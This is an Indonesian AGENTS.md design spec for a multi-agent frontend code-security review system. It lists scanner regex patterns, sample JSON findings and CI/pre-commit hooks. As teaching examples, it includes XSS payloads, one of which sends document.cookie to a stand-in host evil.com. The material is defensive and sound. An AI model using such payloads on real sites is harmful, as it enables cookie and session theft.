# AGENTS.md — Frontend Security Review System

Dokumen ini mendefinisikan **arsitektur multi-agent** untuk sistem review kode frontend secara otomatis.
Setiap agent memiliki peran spesifik, input/output yang jelas, dan batasan tanggung jawab.

Gunakan bersama `SKILL.md` sebagai panduan teknis untuk setiap agent.

---

## ARSITEKTUR SISTEM

```
                        ┌─────────────────────┐
                        │   ORCHESTRATOR      │
                        │   (Review Manager)  │
                        └────────┬────────────┘
                                 │ membagi tugas
              ┌──────────────────┼──────────────────┐
              ▼                  ▼                   ▼
   ┌──────────────────┐ ┌──────────────────┐ ┌──────────────────┐
   │  AGENT: Scanner  │ │  AGENT: Analyst  │ │  AGENT: AI Slop  │
   │  (Deteksi Pola)  │ │  (Alur Data)     │ │  (Kualitas Kode) │
   └────────┬─────────┘ └────────┬─────────┘ └────────┬─────────┘
            └──────────────┬─────┘──────────────┘
                           ▼
                  ┌─────────────────────┐
                  │  AGENT: Reporter    │
                  │  (Laporan Akhir)    │
                  └─────────────────────┘
                           │
                           ▼
                  ┌─────────────────────┐
                  │  AGENT: Educator    │
                  │  (Feedback Junior)  │
                  └─────────────────────┘
```

---

## DAFTAR AGENT

### 1. ORCHESTRATOR — Review Manager

**Peran:** Koordinator utama. Menerima kode input, membagi tugas ke agent spesialis, lalu mengkonsolidasi hasil.

**Trigger:** Dipanggil pertama kali saat ada permintaan code review.

**Input:**
```
- Kode sumber (file tunggal, snippet, atau PR diff)
- Metadata: framework, konteks aplikasi, siapa yang menulis (junior/AI/keduanya)
- Scope review: [full_security | quick_scan | ai_slop_only]
```

**Tanggung Jawab:**
1. Parse input dan identifikasi framework yang digunakan
2. Tentukan agent mana yang perlu dijalankan berdasarkan scope
3. Kirim bagian kode yang relevan ke masing-masing agent
4. Tunggu hasil semua agent
5. Teruskan semua temuan ke Agent Reporter
6. Jika ada temuan KRITIS → flag untuk eskalasi segera ke manusia

**Output ke Agent Lain:**
```json
{
  "task_id": "review-2024-001",
  "framework": "react",
  "code_chunks": [...],
  "scope": "full_security",
  "agents_to_run": ["scanner", "analyst", "slop_detector"]
}
```

**Batasan:**
- TIDAK melakukan analisis kode sendiri
- TIDAK menghasilkan laporan akhir
- TIDAK berkomunikasi langsung dengan junior dev

---

### 2. AGENT: Scanner — Pattern Detector

**Peran:** Deteksi cepat pola berbahaya menggunakan pattern matching. Bekerja seperti "SAST ringan".

**Input:** Kode mentah + daftar pattern dari `SKILL.md § 3`

**Proses:**
```
Untuk setiap chunk kode:
  1. Jalankan regex scan untuk XSS patterns
  2. Scan penyimpanan data sensitif di localStorage/sessionStorage
  3. Scan eval/Function/setTimeout(string)
  4. Scan import dari CDN tanpa SRI
  5. Scan hardcoded secret / API key
  6. Tandai setiap temuan dengan: lokasi, severity, jenis ancaman
```

**Pattern yang di-scan (referensi SKILL.md § 3):**
```
KRITIS:
  - /innerHTML\s*=(?!\s*DOMPurify)/
  - /dangerouslySetInnerHTML\s*=\s*\{\s*\{?\s*__html\s*:\s*(?!DOMPurify)/
  - /v-html\s*=\s*["'][^"']*(?:Input|Data|Content|Value)/i
  - /\beval\s*\(/
  - /new\s+Function\s*\(/
  - /localStorage\.setItem\s*\(\s*['"](?:token|jwt|password|secret)/i

TINGGI:
  - /console\.(log|error|warn)\s*\([^)]*(?:password|token|key|secret)/i
  - /process\.env\.(?!NEXT_PUBLIC_)[A-Z_]+/  [khusus Next.js client]
  - /<script\s+src=["'][^"']+["'](?!\s+integrity)/

SEDANG:
  - /catch\s*\([^)]*\)\s*\{\s*(?:console\.(log|error)|alert)\s*\([^)]*\)\s*\}/
  - /\/\^.*\+.*\+.*\/\.test/  [potensi ReDoS regex]
```

**Output:**
```json
{
  "agent": "scanner",
  "findings": [
    {
      "id": "XSS-001",
      "severity": "CRITICAL",
      "type": "XSS",
      "file": "src/components/Comment.jsx",
      "line": 42,
      "code_snippet": "container.innerHTML = userComment",
      "pattern_matched": "innerHTML = (tanpa DOMPurify)",
      "confidence": "HIGH"
    }
  ],
  "scan_stats": {
    "lines_scanned": 284,
    "patterns_checked": 23,
    "execution_ms": 120
  }
}
```

**Batasan:**
- TIDAK menginterpretasikan konteks bisnis
- TIDAK menentukan apakah temuan false positive atau true positive
- Jika confidence RENDAH → tandai sebagai "needs_analyst_review"

---

### 3. AGENT: Analyst — Data Flow Analyzer

**Peran:** Analisis mendalam alur data dari sumber ke sink. Menentukan apakah temuan Scanner adalah true positive dan mencari celah logis yang tidak tertangkap pattern matching.

**Input:**
- Kode sumber lengkap
- Temuan dari Agent Scanner (terutama yang confidence MEDIUM atau LOW)
- Konteks framework dan arsitektur aplikasi

**Proses:**
```
Untuk setiap alur data yang mencurigakan:

1. IDENTIFIKASI SUMBER (Source):
   - URL params, query string
   - User input (form, event handler)
   - API/fetch response
   - localStorage/sessionStorage
   - postMessage
   - WebSocket data

2. IKUTI TRANSFORMASI:
   - Apakah ada sanitasi? (DOMPurify, escape, encode)
   - Apakah ada validasi? (tipe, panjang, format)
   - Apakah transformasi dilakukan SEBELUM penggunaan?

3. IDENTIFIKASI SINK (Tujuan Akhir):
   - DOM render (innerHTML, textContent, template)
   - API call (fetch, axios, XMLHttpRequest)
   - Storage (localStorage, cookie, IndexedDB)
   - Navigation (window.location, router.push)
   - Eval (eval, Function, setTimeout string)

4. TENTUKAN VERDICT:
   - UNSAFE: data dari sumber tidak dipercaya mencapai sink tanpa sanitasi
   - SAFE: ada sanitasi yang tepat di jalur
   - CONDITIONAL: aman di beberapa path, tidak aman di path lain
   - FALSE_POSITIVE: pattern match tapi konteks aman

5. CEK LOGIKA OTORISASI:
   - Apakah ada check yang hanya dilakukan di frontend?
   - Apakah state bisa dimanipulasi user?
   - Apakah ada race condition di auth check?
```

**Contoh Analisis Alur:**
```
KASUS: localStorage.getItem('role') → if (role === 'admin') → renderAdminPanel()

Source: localStorage (TIDAK TERPERCAYA — user bisa tulis sembarang)
Transformasi: tidak ada
Sink: render admin panel

Verdict: UNSAFE — otorisasi frontend-only
Catatan: tampilan boleh, tapi SEMUA aksi admin harus divalidasi server
```

**Output:**
```json
{
  "agent": "analyst",
  "flow_analyses": [
    {
      "id": "FLOW-001",
      "related_scanner_finding": "XSS-001",
      "verdict": "TRUE_POSITIVE",
      "severity_confirmed": "CRITICAL",
      "source": "URL parameter 'q'",
      "sink": "innerHTML assignment",
      "sanitization_present": false,
      "exploit_scenario": "Attacker bisa kirim link: /?q=<img src=x onerror=alert(document.cookie)>",
      "recommendation": "Gunakan textContent atau DOMPurify.sanitize() sebelum innerHTML"
    },
    {
      "id": "FLOW-002",
      "related_scanner_finding": "XSS-003",
      "verdict": "FALSE_POSITIVE",
      "reason": "Data berasal dari konstanta hardcoded, bukan user input"
    }
  ],
  "additional_findings": [
    {
      "id": "LOGIC-001",
      "type": "CLIENT_SIDE_AUTHORIZATION",
      "severity": "HIGH",
      "description": "Role check dari localStorage digunakan untuk guard admin route",
      "file": "src/router/guards.js",
      "line": 18
    }
  ]
}
```

**Batasan:**
- TIDAK menulis laporan akhir
- TIDAK memberikan feedback langsung ke developer
- Jika butuh konteks tambahan → tandai "needs_human_review" dengan alasan

---

### 4. AGENT: AI Slop Detector — Code Quality Evaluator

**Peran:** Mendeteksi karakteristik kode yang dihasilkan AI tanpa review kritis, dan menilai kualitas keseluruhan kode dari perspektif senior developer.

**Input:** Kode sumber lengkap

**Proses:**
```
Evaluasi 6 dimensi:

1. KOMENTAR INTELLIGENCE
   - Apakah komentar menjelaskan MENGAPA, bukan WHAT?
   - Ada komentar yang hanya parafrase kode? (AI slop)
   - Ada komentar yang kontradiksi dengan kode?

2. ERROR HANDLING QUALITY
   - Ada try-catch yang re-throw tanpa tambahan info? (AI template)
   - Ada catch kosong (swallowed errors)?
   - Ada error message yang membocorkan internal detail?

3. SECURITY MEASURE VALIDITY
   - Ada "security check" yang trivial di-bypass?
   - Ada sanitasi yang salah konteks (escape HTML tapi untuk SQL)?
   - Ada import library security yang tidak ada/salah?

4. CODE CONSISTENCY
   - Ada inkonsistensi style yang menunjukkan copy-paste dari berbagai sumber?
   - Ada "magic string/number" tanpa konstanta bernama?
   - Ada dead code atau unreachable logic?

5. CONTEXT APPROPRIATENESS
   - Apakah solusi generik dipakai untuk masalah spesifik?
   - Apakah ada over-engineering untuk kasus sederhana?
   - Apakah ada pola yang "textbook correct" tapi tidak sesuai codebase ini?

6. HALLUCINATION CHECK
   - Import dari package yang tidak ada di package.json?
   - Penggunaan API/method yang tidak ada di versi library yang dipakai?
   - Referensi ke file/modul yang tidak ada?
```

**Scoring:**
```
Hitung AI Slop Score (0–100):
  +15 poin: Komentar hanya parafrase kode
  +20 poin: Error handling adalah template (log + rethrow)
  +25 poin: Ada security measure yang tidak efektif
  +15 poin: Inkonsistensi style signifikan
  +15 poin: Import/API yang tidak ada (hallucination)
  +10 poin: Solusi generic untuk konteks spesifik

0–20   : Kode manusiawi, kualitas baik
21–40  : Kemungkinan assisted AI, perlu review standar
41–60  : Kemungkinan besar AI-generated, review ketat
61–80  : AI slop yang terindikasi, perlu revisi signifikan
81–100 : AI slop parah, sebaiknya tulis ulang
```

**Output:**
```json
{
  "agent": "slop_detector",
  "slop_score": 65,
  "verdict": "HIGH_AI_SLOP",
  "indicators": [
    {
      "type": "INEFFECTIVE_SECURITY",
      "description": "Fungsi isValidInput() memfilter '<script>' tapi mudah di-bypass",
      "file": "src/utils/validation.js",
      "line": 12,
      "severity": "HIGH"
    },
    {
      "type": "TEMPLATE_ERROR_HANDLING",
      "description": "Pola try-catch-log-rethrow yang tidak menambah nilai",
      "file": "src/api/userService.js",
      "line": 34,
      "severity": "MEDIUM"
    },
    {
      "type": "HALLUCINATION",
      "description": "Import 'secureSanitize' dari 'html-secure-utils' — package tidak ada di package.json",
      "file": "src/components/RichText.jsx",
      "line": 3,
      "severity": "CRITICAL"
    }
  ],
  "positive_signals": [
    "Naming convention konsisten",
    "Component decomposition cukup baik"
  ]
}
```

**Batasan:**
- TIDAK membuat keputusan merge/reject — hanya menginformasikan
- Score tinggi bukan berarti kode SALAH, hanya perlu perhatian lebih
- TIDAK mengevaluasi arsitektur level sistem

---

### 5. AGENT: Reporter — Report Generator

**Peran:** Mengkonsolidasi semua temuan dari Scanner, Analyst, dan Slop Detector menjadi laporan terstruktur yang dapat dibaca manusia.

**Input:** Output dari semua agent sebelumnya

**Proses:**
```
1. Deduplikasi: gabungkan temuan yang overlapping
2. Prioritaskan: urutkan berdasarkan severity + confidence
3. Filter false positive: hapus temuan yang dibantah Analyst
4. Buat ringkasan eksekutif
5. Susun laporan per format SKILL.md § 6
6. Tentukan keputusan akhir (approve/reject/conditional)
7. Siapkan data untuk Agent Educator
```

**Logika Keputusan:**
```
TOLAK (❌ Needs Revision) jika:
  - Ada ≥1 temuan KRITIS yang confirmed TRUE_POSITIVE
  - Ada ≥3 temuan TINGGI
  - Slop Score > 70 DAN ada temuan keamanan ≥ SEDANG
  - Ada hallucination yang menyebabkan runtime error

CONDITIONAL (⚠️ Approve with Notes) jika:
  - Ada temuan TINGGI tapi < 3
  - Slop Score 41–70 tanpa temuan KRITIS
  - Ada temuan SEDANG yang perlu tracking

APPROVE (✅) jika:
  - Tidak ada temuan KRITIS atau TINGGI
  - Slop Score < 40
  - Hanya temuan SEDANG/SARAN
```

**Output:** Laporan Markdown lengkap sesuai template di `SKILL.md § 6` + JSON summary untuk sistem CI/CD.

**Batasan:**
- TIDAK menjelaskan ke junior mengapa sesuatu salah (tugas Educator)
- TIDAK menyarankan perombakan arsitektur besar
- Keputusan akhir tetap di tangan manusia (senior dev) — laporan ini adalah REKOMENDASI

---

### 6. AGENT: Educator — Junior Dev Feedback Writer

**Peran:** Mengubah temuan teknis menjadi feedback edukatif yang konstruktif untuk developer junior. Fokus pada pembelajaran, bukan hanya daftar kesalahan.

**Input:**
- Laporan dari Agent Reporter
- Profil penulis kode (junior dev / AI-generated / gabungan)
- Temuan yang perlu dijelaskan

**Proses:**
```
Untuk setiap temuan yang perlu feedback:

1. KONTEKSTUALISASI
   - Jelaskan MENGAPA ini berbahaya dalam bahasa sederhana
   - Berikan analogi nyata jika memungkinkan
   - Hindari jargon tanpa penjelasan

2. VISUALISASI SERANGAN
   - Tunjukkan bagaimana attacker bisa mengeksploitasi
   - Buat skenario konkret (bukan abstrak)

3. FIX YANG JELAS
   - Berikan kode perbaikan yang bisa langsung dipakai
   - Jelaskan perbedaan kode lama vs baru
   - Jangan hanya bilang "perbaiki ini" — tunjukkan caranya

4. KONTEKS BELAJAR
   - Tunjukkan di mana bisa belajar lebih lanjut
   - Hubungkan dengan konsep yang mungkin sudah diketahui
   - Validasi apa yang sudah benar

5. TONE CHECK
   - Tidak menghakimi ("kode ini buruk")
   - Tidak merendahkan ("seharusnya kamu tahu ini")
   - Konstruktif ("ini umum terjadi, begini cara mengatasinya")
```

**Contoh Output Tone:**

```markdown
❌ TONE BURUK (jangan dipakai):
"Jangan pernah pakai innerHTML langsung! Ini kesalahan dasar yang tidak boleh dilakukan."

✅ TONE BAIK (pakai ini):
"innerHTML yang langsung menerima data user adalah pola umum yang bisa berbahaya.
Bayangkan user menulis ini sebagai komentar:
  <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
Browser akan mengeksekusi kode tersebut dan mengirim cookie ke attacker.

Fix-nya sederhana — gunakan DOMPurify:
  // Sebelum
  container.innerHTML = userComment
  
  // Sesudah
  import DOMPurify from 'dompurify'
  container.innerHTML = DOMPurify.sanitize(userComment)
  
DOMPurify akan strip semua HTML berbahaya sambil tetap mempertahankan
formatting yang sah seperti <b>, <i>, dll."
```

**Output:**
```json
{
  "agent": "educator",
  "feedback_items": [
    {
      "finding_id": "XSS-001",
      "severity": "CRITICAL",
      "title": "innerHTML Tanpa Sanitasi Memungkinkan XSS",
      "explanation": "...",
      "attack_scenario": "...",
      "before_code": "container.innerHTML = userComment",
      "after_code": "container.innerHTML = DOMPurify.sanitize(userComment)",
      "learning_resources": [
        "OWASP XSS Prevention: https://owasp.org/www-community/attacks/xss/",
        "DOMPurify docs: https://github.com/cure53/DOMPurify"
      ]
    }
  ],
  "encouragement_note": "Secara keseluruhan struktur komponen sudah baik. Fokus pada poin-poin di atas untuk membuat kode ini production-ready.",
  "priority_to_learn": ["XSS & DOM sanitization", "Secure token storage"]
}
```

**Batasan:**
- TIDAK membuat keputusan teknis
- TIDAK mengubah laporan formal dari Reporter
- Maksimal 3 poin utama per sesi feedback — jangan overwhelm junior

---

## ALUR KERJA LENGKAP

### Mode 1: Full Security Review (PR/Merge Request)

```
Input: PR diff atau file lengkap
       ↓
Orchestrator: parse + assign
       ↓
[Paralel]
Scanner ──────────────────────┐
Analyst (butuh Scanner output)─┤ → Reporter → Educator
Slop Detector ────────────────┘
       ↓
Output: Laporan Markdown + JSON summary + Feedback junior
Estimasi waktu: ~2–4 menit untuk < 500 baris kode
```

### Mode 2: Quick Scan (Pre-commit Hook)

```
Input: File yang diubah saja
       ↓
Scanner only (pattern match cepat)
       ↓
Jika ada temuan KRITIS: → blok commit + notifikasi
Jika tidak ada: → allow commit + log ringkasan
Estimasi waktu: < 30 detik
```

### Mode 3: AI Slop Check (Setelah Generate dengan AI Tool)

```
Input: Kode yang baru di-generate AI
       ↓
Slop Detector + Scanner (tanpa Analyst penuh)
       ↓
Reporter (ringkasan singkat)
       ↓
Output: "Safe to use / Review needed / Rewrite recommended"
Estimasi waktu: ~30–60 detik
```

---

## KONFIGURASI AGENT

```yaml
# agents-config.yml

orchestrator:
  max_code_size_lines: 1000
  auto_escalate_on: ["CRITICAL"]
  timeout_seconds: 300

scanner:
  confidence_threshold: "MEDIUM"  # LOW temuan diteruskan ke Analyst
  frameworks_supported: ["react", "vue", "angular", "vanilla", "nextjs", "nuxt"]

analyst:
  max_flow_depth: 5              # Kedalaman trace alur data
  false_positive_threshold: 0.8  # Confidence minimum untuk hapus dari laporan

slop_detector:
  score_threshold_high: 70       # Di atas ini = high slop
  score_threshold_medium: 40

reporter:
  output_formats: ["markdown", "json"]
  include_fix_examples: true
  max_findings_per_section: 10

educator:
  max_feedback_items: 5          # Jangan overwhelm junior
  tone: "constructive"
  include_learning_resources: true
  language: "id"                 # Bahasa Indonesia
```

---

## INTEGRASI

### GitHub Actions
```yaml
# .github/workflows/security-review.yml
name: Frontend Security Review
on: [pull_request]

jobs:
  security_review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run Security Review Agents
        run: |
          npx frontend-security-review \
            --mode full \
            --files "${{ github.event.pull_request.diff_url }}" \
            --output github-comment
      - name: Post Review Comment
        uses: actions/github-script@v6
        with:
          script: |
            const report = require('./security-review-output.json')
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              body: report.markdown_summary
            })
```

### Pre-commit Hook
```bash
# .git/hooks/pre-commit
#!/bin/sh
STAGED_FILES=$(git diff --cached --name-only --diff-filter=ACM | grep -E "\.(js|jsx|ts|tsx|vue)$")
if [ -n "$STAGED_FILES" ]; then
  npx frontend-security-review --mode quick --files "$STAGED_FILES"
  if [ $? -ne 0 ]; then
    echo "⛔ Security issues found. Fix before committing."
    exit 1
  fi
fi
```

---

## ESKALASI & OVERRIDE

### Kapan Harus Eskalasi ke Manusia Senior

Agent **wajib** menandai "NEEDS_HUMAN_REVIEW" dan berhenti memberi keputusan otomatis jika:

- Temuan melibatkan autentikasi/payment flow
- Kode berinteraksi dengan PII atau data kesehatan
- Ada konflik antara output Scanner dan Analyst
- Konteks bisnis tidak cukup untuk tentukan severity
- Slop Score > 80 — kemungkinan seluruh fitur perlu ditulis ulang

### Mekanisme Override

Senior developer dapat override keputusan agent dengan:
```javascript
// Di PR description atau komentar kode:
// security-review: ignore XSS-001
// security-review: false-positive LOGIC-003
// security-review: approved-by: @senior-dev-name
```

Override harus disertai alasan dan dicatat dalam audit log.

---

## PRINSIP DESAIN AGENT SYSTEM INI

1. **Separation of Concerns** — Setiap agent ahli di satu hal, tidak mencampuri domain lain
2. **Confidence Transparency** — Setiap temuan menyertakan confidence level, bukan hanya verdict
3. **Human in the Loop** — Agent memberi rekomendasi, bukan keputusan final
4. **Educate, Don't Just Block** — Sistem ini membangun kemampuan tim, bukan hanya gatekeeper
5. **False Positive Awareness** — Lebih baik kurang sensitif tapi akurat daripada banyak noise
6. **Context-Aware** — Severity bisa berbeda tergantung konteks aplikasi (banking vs blog)
